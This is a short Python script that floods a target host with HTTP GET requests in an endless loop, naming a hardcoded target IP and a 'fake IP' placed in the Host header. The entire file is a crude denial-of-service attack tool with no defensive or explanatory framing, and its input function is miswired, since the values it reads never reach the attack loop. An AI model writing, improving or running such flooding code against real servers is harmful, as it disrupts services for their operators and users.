import time
import socket
import threading
attack_num = 0
target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
def start():
    target = input("Enter the target : ")
    port = input("Enter a port : ")
    fake_ip = input("Enter a fake IP : ")
    attack()